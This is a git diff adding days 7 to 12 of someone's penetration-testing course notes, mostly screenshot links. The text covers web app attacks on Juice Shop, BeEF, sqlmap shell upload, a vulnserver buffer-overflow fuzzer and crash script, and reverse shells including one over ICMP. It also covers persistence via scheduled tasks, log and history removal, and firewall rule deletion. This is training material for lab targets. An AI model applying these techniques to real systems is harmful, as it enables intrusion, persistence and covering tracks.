@@ -770,8 +770,6 @@ search portscan
 
 ![](assets/2022-08-27-19-19-06-image.png)
 
-
-
 ![](assets/2022-08-27-19-19-52-image.png)
 
 ![](assets/2022-08-27-19-20-41-image.png)
@@ -895,3 +893,931 @@ meterpreter > webcam_snap -I 2
 ![](assets/2022-08-27-20-46-51-image.png)
 
 ![](assets/2022-08-27-20-48-20-image.png)
+
+---
+
+### Day 7  – Web application pentesting
+
+![](assets/2022-08-29-19-05-37-image.png)
+
+![](assets/2022-08-29-19-05-54-image.png)
+
+```
+https://owasp.org/www-project-top-ten/
+```
+
+```
+https://nodejs.org
+```
+
+**Install Version 18.8.0**
+
+![](assets/2022-08-29-19-08-56-image.png)
+
+```
+https://github.com/juice-shop/juice-shop#from-sources
+```
+
+![](assets/2022-08-29-19-20-20-image.png)
+
+![](assets/2022-08-29-19-21-12-image.png)
+
+![](assets/2022-08-29-19-27-04-image.png)
+
+![](assets/2022-08-29-19-32-48-image.png)
+
+![](assets/2022-08-29-19-36-26-image.png)
+
+![](assets/2022-08-29-19-37-00-image.png)
+
+![](assets/2022-08-29-19-37-49-image.png)
+
+![](assets/2022-08-29-19-40-46-image.png)
+
+![](assets/2022-08-29-19-45-39-image.png)
+
+![](assets/2022-08-29-19-46-12-image.png)
+
+![](assets/2022-08-29-19-46-43-image.png)
+
+![](assets/2022-08-29-19-48-22-image.png)
+
+![](assets/2022-08-29-19-56-41-image.png)
+
+Good Framework for Attacker
+
+https://beefproject.com/
+
+**Put in Search Field**
+
+![](assets/2022-08-29-20-07-43-image.png)
+
+![](assets/2022-08-29-20-16-44-image.png)
+
+![](assets/2022-08-29-20-16-56-image.png)
+
+![](assets/2022-08-29-20-17-10-image.png)
+
+![](assets/2022-08-29-20-17-21-image.png)
+
+![](assets/2022-08-29-20-18-03-image.png)
+
+![](assets/2022-08-29-20-19-27-image.png)
+
+![](assets/2022-08-29-20-21-42-image.png)
+
+![](assets/2022-08-29-20-22-16-image.png)
+
+![](assets/2022-08-29-20-23-11-image.png)
+
+![](assets/2022-08-29-20-26-41-image.png)
+
+![](assets/2022-08-29-20-27-53-image.png)
+
+![](assets/2022-08-29-20-31-41-image.png)
+
+![](assets/2022-08-29-20-29-30-image.png)
+
+![](assets/2022-08-29-20-45-04-image.png)
+
+![](assets/2022-08-29-20-36-45-image.png)
+
+![](assets/2022-08-29-20-43-03-image.png)
+
+[GitHub - prometheus/prometheus: The Prometheus monitoring system and time series database.](https://github.com/prometheus/prometheus)
+
+![](assets/2022-08-29-20-46-45-image.png)
+
+![](assets/2022-08-29-20-50-50-image.png)
+
+---
+
+### Day 8 – Web application pentesting
+
+![](assets/2022-08-30-19-40-00-image.png)
+
+> From HERBAIN BOGNON to Everyone: Launch the web server with <mark>npm start </mark>in the webapp folder then open a web browser to localhost:3000
+
+![](assets/2022-08-30-19-11-19-image.png)
+
+![](assets/2022-08-30-19-13-07-image.png)
+
+![](assets/2022-08-30-19-14-40-image.png)
+
+```
+SELECT * FROM user WHERE user = ‘%s' AND password = ‘%s‘
+```
+
+![](assets/2022-08-30-19-21-27-image.png)
+
+![](assets/2022-08-30-19-21-45-image.png)
+
+![](assets/2022-08-30-19-25-38-image.png)
+
+![](assets/2022-08-30-19-27-47-image.png)
+
+![](assets/2022-08-30-19-27-56-image.png)
+
+![](assets/2022-08-30-19-28-21-image.png)
+
+```
+locate big.txt
+```
+
+![](assets/2022-08-30-19-30-31-image.png)
+
+![](assets/2022-08-30-19-34-04-image.png)
+
+![](assets/2022-08-30-19-35-03-image.png)
+
+![](assets/2022-08-30-19-35-25-image.png)
+
+![](assets/2022-08-30-19-38-18-image.png)
+
+![](assets/2022-08-30-19-40-16-image.png)
+
+![](assets/2022-08-30-19-42-50-image.png)
+
+```
+locate webshell
+```
+
+![](assets/2022-08-30-19-45-35-image.png)
+
+![](assets/2022-08-30-19-48-25-image.png)
+
+![](assets/2022-08-30-19-51-31-image.png)
+
+![](assets/2022-08-30-19-52-09-image.png)
+
+![](assets/2022-08-30-19-52-40-image.png)
+
+![](assets/2022-08-30-19-52-49-image.png)
+
+![](assets/2022-08-30-20-04-29-image.png)
+
+![](assets/2022-08-30-20-05-17-image.png)
+
+![](assets/2022-08-30-20-05-59-image.png)
+
+![](assets/2022-08-30-20-06-10-image.png)
+
+![](assets/2022-08-30-20-07-27-image.png)
+
+![](assets/2022-08-30-20-23-31-image.png)
+
+![](assets/2022-08-30-20-24-25-image.png)
+
+![](assets/2022-08-30-20-26-06-image.png)
+
+![](assets/2022-08-30-20-28-10-image.png)
+
+![](assets/2022-08-30-20-30-46-image.png)
+
+![](assets/2022-08-30-20-33-11-image.png)
+
+![](assets/2022-08-30-20-38-12-image.png)
+
+![](assets/2022-08-30-20-44-07-image.png)
+
+![](assets/2022-08-30-20-45-58-image.png)
+
+![](assets/2022-08-30-20-47-15-image.png)
+
+![](assets/2022-08-30-20-52-26-image.png)
+
+![](assets/2022-08-30-20-59-30-image.png)
+
+![](assets/2022-08-30-21-01-17-image.png)
+
+---
+
+### Day 9 – Buffer Overflow
+
+```
+Check the security.txt if there's information about the bug bounty (same as robots.txt)
+```
+
+![](assets/2022-08-31-19-11-34-image.png)
+
+![](assets/2022-08-31-19-12-42-image.png)
+
+![](assets/2022-08-31-19-14-12-image.png)
+
+![](assets/2022-08-31-19-19-42-image.png)
+
+![](assets/2022-08-31-19-23-13-image.png)
+
+![](assets/2022-08-31-19-23-44-image.png)
+
+![](assets/2022-08-31-19-23-55-image.png)
+
+Steps:
+
+1. Crosssite Scripting
+
+2. Session Hijacking
+
+![](assets/2022-08-31-19-26-01-image.png)
+
+> **What is BeEF?**
+> 
+> BeEF is short for The Browser Exploitation Framework. It is a
+>  penetration testing tool that focuses on the web browser.
+
+https://beefproject.com/
+
+![](assets/2022-08-31-19-32-05-image.png)
+
+![](assets/2022-08-31-19-33-37-image.png)
+
+![](assets/2022-08-31-19-35-54-image.png)
+
+![](assets/2022-08-31-19-36-02-image.png)
+
+![](assets/2022-08-31-19-38-30-image.png)
+
+![](assets/2022-08-31-19-38-42-image.png)
+
+![](assets/2022-08-31-19-40-54-image.png)
+
+![](assets/2022-08-31-19-41-40-image.png)
+
+![](assets/2022-08-31-19-43-37-image.png)
+
+![](assets/2022-08-31-19-44-49-image.png)
+
+![](assets/2022-08-31-19-45-57-image.png)
+
+![](assets/2022-08-31-19-46-07-image.png)
+
+![](assets/2022-08-31-19-47-06-image.png)
+
+![](assets/2022-08-31-19-47-31-image.png)
+
+![](assets/2022-08-31-19-50-27-image.png)
+
+![](assets/2022-08-31-19-51-11-image.png)
+
+![](assets/2022-08-31-19-52-56-image.png)
+
+![](assets/2022-08-31-19-53-43-image.png)
+
+**sqlmap OS shell upload**
+
+![](assets/2022-08-31-19-55-27-image.png)
+
+![](assets/2022-08-31-19-54-34-image.png)
+
+![](assets/2022-08-31-19-55-38-image.png)
+
+**VM he used**
+
+```
+https://www.vulnhub.com/entry/pentester-lab-xss-and-mysql-file,66/
+```
+
+**Buffer Overflow**
+
+![](assets/2022-08-31-20-11-54-image.png)
+
+```
+https://github.com/stephenbradshaw/vulnserver
+```
+
+![](assets/2022-08-31-20-14-26-image.png)
+
+```
+https://immunityinc.com/products/debugger/
+```
+
+![](assets/2022-08-31-20-14-42-image.png)
+
+![](assets/2022-08-31-20-17-38-image.png)
+
+![](assets/2022-08-31-20-18-29-image.png)
+
+![](assets/2022-08-31-20-18-44-image.png)
+
+Code:
+
+```
+#!/usr/bin/python
+
+import socket
+import os
+import sys
+import time
+
+host="10.211.55.7"
+port=4444
+
+buffer=["A"]
+counter=100
+while len(buffer) <= 30:
+                buffer.append("A"*counter)
+                counter=counter+200
+
+for string in buffer:
+        print "fuzzing TRUN with %s bytes" % len(string)
+        expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        expl.connect((host, port))
+        expl.send("TRUN /.:/" + string)
+        expl.close()
+    time.sleep(1)
+```
+
+![](assets/2022-08-31-20-20-12-image.png)
+
+![](assets/2022-08-31-20-20-38-image.png)
+
+**Menu -> File -> Attach**
+
+![](assets/2022-08-31-20-21-28-image.png)
+
+![](assets/2022-08-31-20-21-57-image.png)
+
+**Click "Play" Button**
+
+![](assets/2022-08-31-20-22-19-image.png)
+
+![](assets/2022-08-31-20-25-14-image.png)
+
+![](assets/2022-08-31-20-27-20-image.png)
+
+![](assets/2022-08-31-20-27-36-image.png)
+
+**Lead to DDoS**
+
+![](assets/2022-08-31-20-29-25-image.png)
+
+[Buffer overflow pattern generator](https://wiremask.eu/tools/buffer-overflow-pattern-generator/)
+
+![](assets/2022-08-31-20-32-30-image.png)
+
+```
+#!/usr/bin/python
+
+import socket
+import os
+import sys
+
+host="10.211.55.7"
+port=4444
+
+buffer = "TRUN /.:/" + "A" * 5900
+
+expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+expl.connect((host, port))
+expl.send(buffer)
+expl.close()
+```
+
+![](assets/2022-08-31-20-34-39-image.png)
+
+![](assets/2022-08-31-20-35-06-image.png)
+
+![](assets/2022-08-31-20-35-24-image.png)
+
+![](assets/2022-08-31-20-35-35-image.png)
+
+![](assets/2022-08-31-20-36-38-image.png)
+
+![](assets/2022-08-31-20-36-47-image.png)
+
+![](assets/2022-08-31-20-37-03-image.png)
+
+![](assets/2022-08-31-20-37-21-image.png)
+
+```
+https://shell-storm.org/shellcode/
+```
+
+![](assets/2022-08-31-20-40-22-image.png)
+
+**Restart Server**
+
+![](assets/2022-08-31-20-41-38-image.png)
+
+**Restart Immunity Debugger**
+
+![](assets/2022-08-31-20-42-07-image.png)
+
+![](assets/2022-08-31-20-46-01-image.png)
+
+![](assets/2022-08-31-20-46-59-image.png)
+
+![](assets/2022-08-31-20-50-27-image.png)
+
+![](assets/2022-08-31-20-50-39-image.png)
+
+![](assets/2022-08-31-20-50-51-image.png)
+
+**Avoid ASLR (Memory Protection)**
+
+![](assets/2022-08-31-20-52-01-image.png)
+
+> From Chat:
+> 
+> from quick search in Google: What is ASLR in operating system?
+> ASLR MEANING Address Space Layout Randomization (ASLR) is a computer security technique which involves randomly positioning the base address of an executable and the position of libraries, heap, and stack, in a process's address space.
+
+- LiveOverflow on youtube
+
+- Plus the Tryhackme Buffer Overflow Prep room
+
+- Also consider learning pwntools
+
+---
+
+## Day 10 – Privilege Escalation
+
+![](assets/2022-09-01-19-17-07-image.png)
+
+![](assets/2022-09-01-19-13-23-image.png)
+
+![](assets/2022-09-01-19-13-34-image.png)
+
+![](assets/2022-09-01-19-13-54-image.png)
+
+![](assets/2022-09-01-19-14-28-image.png)
+
+![](assets/2022-09-01-19-15-15-image.png)
+
+search for `jump esp`
+
+![](assets/2022-09-01-19-20-22-image.png)
+
+![](assets/2022-09-01-19-22-56-image.png)
+
+![](assets/2022-09-01-19-26-12-image.png)
+
+![](assets/2022-09-01-19-26-37-image.png)
+
+> From Chat
+> 
+> If you're Looking for strings in a program, you could also use something like Ghidra or IDA
+
+![](assets/2022-09-01-19-27-51-image.png)
+
+![](assets/2022-09-01-19-29-14-image.png)
+
+> From Chat:
+> Also one on the history of Ghidra (used to be a tool developped by IntelligenceAgencies and then became open source:
+> 
+> https://www.youtube.com/watch?v=kx2xp7IQNSc
+
+![](assets/2022-09-01-19-33-34-image.png)
+
+![](assets/2022-09-01-19-36-45-image.png)
+
+![](assets/2022-09-01-19-37-10-image.png)
+
+![](assets/2022-09-01-19-39-18-image.png)
+
+`351` is payload size
+
+![](assets/2022-09-01-19-40-11-image.png)
+
+\x90 (is a space) multiply by 16
+
+![](assets/2022-09-01-19-42-00-image.png)
+
+![](assets/2022-09-01-19-42-13-image.png)
+
+**Programm not anymore crasht**
+
+![](assets/2022-09-01-19-43-11-image.png)
+
+**Reverse shell worked**
+
+![](assets/2022-09-01-19-43-25-image.png)
+
+**Remote Desktop**
+
+![](assets/2022-09-01-19-52-13-image.png)
+
+![](assets/2022-09-01-19-55-35-image.png)
+
+![](assets/2022-09-01-19-55-42-image.png)
+
+```
+https://github.com/stephenbradshaw/vulnserver
+```
+
+> From Chat
+> 
+> Here's an example from a CSS course Assignment, where I did some powershel deobfuscation from a payload extracted from a memory dump:
+> 
+> https://import.cdn.thinkific.com/380432/nmxRVUvRmW4ICetXD2ww_Assignment-20--20Volatility-2001-20--20Robert-20Seyer.pdf
+
+![](assets/2022-09-01-20-14-58-image.png)
+
+```
+show payloads
+```
+
+![](assets/2022-09-01-20-15-19-image.png)
+
+```
+show info
+```
+
+```
+show options
+```
+
+![](assets/2022-09-01-20-16-44-image.png)
+
+![](assets/2022-09-01-20-17-17-image.png)
+
+![](assets/2022-09-01-20-18-25-image.png)
+
+![](assets/2022-09-01-20-18-56-image.png)
+
+![](assets/2022-09-01-20-19-21-image.png)
+
+![](assets/2022-09-01-20-19-47-image.png)
+
+![](assets/2022-09-01-20-20-15-image.png)
+
+![](assets/2022-09-01-20-20-51-image.png)
+
+![](assets/2022-09-01-20-21-25-image.png)
+
+![](assets/2022-09-01-20-22-05-image.png)
+
+![](assets/2022-09-01-20-23-00-image.png)
+
+![](assets/2022-09-01-20-23-27-image.png)
+
+![](assets/2022-09-01-20-23-45-image.png)
+
+![](assets/2022-09-01-20-23-52-image.png)
+
+![](assets/2022-09-01-20-24-03-image.png)
+
+![](assets/2022-09-01-20-24-56-image.png)
+
+![](assets/2022-09-01-20-28-06-image.png)
+
+![](assets/2022-09-01-20-30-14-image.png)
+
+**Remove Logs**
+
+![](assets/2022-09-01-20-49-13-image.png)
+
+![](assets/2022-09-01-20-49-39-image.png)
+
+![](assets/2022-09-01-20-32-32-image.png)
+
+![](assets/2022-09-01-20-35-40-image.png)
+
+![](assets/2022-09-01-20-35-08-image.png)
+
+![](assets/2022-09-01-20-36-14-image.png)
+
+![](assets/2022-09-01-20-36-28-image.png)
+
+![](assets/2022-09-01-20-36-53-image.png)
+
+![](assets/2022-09-01-20-37-06-image.png)
+
+**Delete SingelCommand in History**
+
+![](assets/2022-09-01-20-38-29-image.png)
+
+![](assets/2022-09-01-20-39-39-image.png)
+
+![](assets/2022-09-01-20-41-59-image.png)
+
+![](assets/2022-09-01-20-42-13-image.png)
+
+![](assets/2022-09-01-20-43-52-image.png)
+
+![](assets/2022-09-01-20-45-18-image.png)
+
+![](assets/2022-09-01-20-45-38-image.png)
+
+![](assets/2022-09-01-20-46-37-image.png)
+
+![](assets/2022-09-01-20-47-21-image.png)
+
+![](assets/2022-09-01-20-49-23-image.png)
+
+![](assets/2022-09-01-20-50-00-image.png)
+
+![](assets/2022-09-01-20-50-19-image.png)
+
+![](assets/2022-09-01-20-50-39-image.png)
+
+![](assets/2022-09-01-20-50-46-image.png)
+
+![](assets/2022-09-01-20-51-58-image.png)
+
+![](assets/2022-09-01-20-59-53-image.png)
+
+![](assets/2022-09-01-21-00-20-image.png)
+
+![](assets/2022-09-01-21-00-30-image.png)
+
+```
+netsh advfirewall firewall delete rule name=all protocol=tcp localport=80
+```
+
+![](assets/2022-09-01-21-00-44-image.png)
+
+> Scheduled Tasks are a popular way to get persistence on a machine.
+
+![](assets/2022-09-01-21-01-05-image.png)
+
+Replace Task with your own Reverse Shell .exe
+
+![](assets/2022-09-01-21-02-28-image.png)
+
+![](assets/2022-09-01-21-02-43-image.png)
+
+---
+
+## Day 11 -  Friday: Linux privilege escalation and lateral movement
+
+![](assets/2022-09-02-19-13-19-image.png)
+
+![](assets/2022-09-02-19-14-17-image.png)
+
+![](assets/2022-09-02-19-14-50-image.png)
+
+![](assets/2022-09-02-19-16-47-image.png)
+
+![](assets/2022-09-02-19-16-58-image.png)
+
+![](assets/2022-09-02-19-18-07-image.png)
+
+![](assets/2022-09-02-19-18-22-image.png)
+
+![](assets/2022-09-02-19-23-48-image.png)
+
+![](assets/2022-09-02-19-24-33-image.png)
+
+![](assets/2022-09-02-19-25-50-image.png)
+
+![](assets/2022-09-02-19-29-10-image.png)
+
+```
+https://www.fuzzysecurity.com/tutorials/files/wmic_info.rar
+```
+
+![](assets/2022-09-02-19-33-52-image.png)
+
+![](assets/2022-09-02-19-34-04-image.png)
+
+![](assets/2022-09-02-19-35-45-image.png)
+
+![](assets/2022-09-02-19-37-08-image.png)
+
+**Or directly over Internet:**
+
+```
+https://live.sysinternals.com/
+```
+
+![](assets/2022-09-02-19-43-44-image.png)
+
+![](assets/2022-09-02-19-40-49-image.png)
+
+![](assets/2022-09-02-19-56-20-image.png)
+
+![](assets/2022-09-02-19-45-00-image.png)
+
+```
+https://github.com/absolomb/WindowsEnum
+```
+
+![](assets/2022-09-02-19-51-50-image.png)
+
+```
+PS C:\Users\Admin> curl -OutFile pslist.exe https://live.sysinternals.com/
+
+PS C:\Users\Admin> ls .\pslist.exe
+
+
+    Directory: C:\Users\Admin
+
+
+Mode                LastWriteTime         Length Name                                                                                                                    
+----                -------------         ------ ----                                                                                                                    
+-a----       02/09/2022     14:50          17399 pslist.exe
+```
+
+![](assets/2022-09-02-19-56-31-image.png)
+
+![](assets/2022-09-02-19-58-17-image.png)
+
+![](assets/2022-09-02-20-04-36-image.png)
+
+![](assets/2022-09-02-20-06-07-image.png)
+
+![](assets/2022-09-02-20-09-15-image.png)
+
+![](assets/2022-09-02-20-14-00-image.png)
+
+![](assets/2022-09-02-20-14-09-image.png)
+
+![](assets/2022-09-02-20-28-04-image.png)
+
+![](assets/2022-09-02-20-28-32-image.png)
+
+![](assets/2022-09-02-20-28-44-image.png)
+
+![](assets/2022-09-02-20-29-13-image.png)
+
+![](assets/2022-09-02-20-31-13-image.png)
+
+![](assets/2022-09-02-20-31-56-image.png)
+
+![](assets/2022-09-02-20-32-05-image.png)
+
+```
+ps root
+```
+
+```
+ps -ef | less
+```
+
+```
+top
+```
+
+![](assets/2022-09-02-20-34-17-image.png)
+
+![](assets/2022-09-02-20-35-04-image.png)
+
+![](assets/2022-09-02-20-35-18-image.png)
+
+![](assets/2022-09-02-20-36-34-image.png)
+
+![](assets/2022-09-02-20-36-42-image.png)
+
+![](assets/2022-09-02-20-37-33-image.png)
+
+![](assets/2022-09-02-20-37-22-image.png)
+
+![](assets/2022-09-02-20-41-39-image.png)
+
+![](assets/2022-09-02-20-45-16-image.png)
+
+![](assets/2022-09-02-20-45-48-image.png)
+
+![](assets/2022-09-02-20-46-00-image.png)
+
+```
+https://pentestmonkey.net/tools/audit/unix-privesc-check
+```
+
+```
+https://www.cyberciti.biz/open-source/command-line-hacks/linux-run-command-as-different-user/
+```
+
+![](assets/2022-09-02-20-48-00-image.png)
+
+![](assets/2022-09-02-20-50-58-image.png)
+
+```
+https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+```
+
+![](assets/2022-09-02-20-57-19-image.png)
+
+![](assets/2022-09-02-20-59-05-image.png)
+
+---
+
+## Day 12 - Pentest simulation and report creation
+
+
+
+```
+sudo apt install python3-pip
+sudo git clone https://github.com/SecureAuthCorp/impacket.git
+sudo pip3 install -r /opt/impacket/requirements.txt
+sudo python3 /opt/impacket/setup.py install
+sudo git clone https://github.com/bdamele/icmpsh.git
+cd icmpsh
+```
+
+
+
+
+
+![](assets/2022-09-03-19-07-33-image.png)
+
+![](assets/2022-09-03-19-07-59-image.png)
+
+```
+sudo git clone https://github.com/SecureAuthCorp/impacket.git
+```
+
+![](assets/2022-09-03-19-09-12-image.png)
+
+![](assets/2022-09-03-19-09-42-image.png)
+
+```
+sudo git clone https://github.com/bdamele/icmpsh.git
+```
+
+![](assets/2022-09-03-19-12-12-image.png)
+
+![](assets/2022-09-03-19-14-34-image.png)
+
+```
+net.ipv4.icmp_echo_ignore_all=1
+```
+
+![](assets/2022-09-03-19-17-33-image.png)
+
+![](assets/2022-09-03-19-19-03-image.png)
+
+![](assets/2022-09-03-19-21-27-image.png)
+
+![](assets/2022-09-03-19-21-44-image.png)
+
+![](assets/2022-09-03-19-22-16-image.png)
+
+![](assets/2022-09-03-19-22-58-image.png)
+
+**Reverse shell via ICMP**
+
+![](assets/2022-09-03-19-33-38-image.png)
+
+![](assets/2022-09-03-19-34-03-image.png)
+
+![](assets/2022-09-03-19-35-18-image.png)
+
+![](assets/2022-09-03-19-39-22-image.png)
+
+```
+https://docs.microsoft.com/en-us/microsoft-365/security/office-365-security/attack-simulation-training-get-started?view=o365-worldwide
+```
+
+
+
+![](assets/2022-09-03-20-01-46-image.png)
+
+
+
+> You would've been the guy they would've pointed the finger at if shit hit the fan.
+> 
+> In the CSS class, the term "CYA" was used. CYA standing for "Cover your ass", which means, in situations like this, when management is making questionable decisions against your advice, make sure to get it in writing, so that you're safe when shit does hit the fan :)
+
+
+
+![](assets/2022-09-03-20-20-56-image.png)
+
+![](assets/2022-09-03-20-21-59-image.png)
+
+![](assets/2022-09-03-20-22-16-image.png)
+
+![](assets/2022-09-03-20-23-12-image.png)
+
+![](assets/2022-09-03-20-23-19-image.png)
+
+![](assets/2022-09-03-20-23-30-image.png)
+
+![](assets/2022-09-03-20-26-35-image.png)
+
+![](assets/2022-09-03-20-26-46-image.png)
+
+![](assets/2022-09-03-20-27-11-image.png)
+
+![](assets/2022-09-03-20-34-02-image.png)
+
+![](assets/2022-09-03-20-35-08-image.png)
+
+![](assets/2022-09-03-20-40-08-image.png)
+
+![](assets/2022-09-03-20-41-10-image.png)
+
+![](assets/2022-09-03-20-42-26-image.png)
+
+![](assets/2022-09-03-20-44-26-image.png)
+
+![](assets/2022-09-03-20-44-37-image.png)
+
+![](assets/2022-09-03-20-52-04-image.png)
+
+
+
+
+
+
+
+![](assets/2022-09-03-21-00-13-image.png)
+
+---
+
+> [All Scripts](assets/Scripts.zip)
+
+
+
+> [Pentest Report Template](assets/satiexs-penetration-test-report-template.docx)
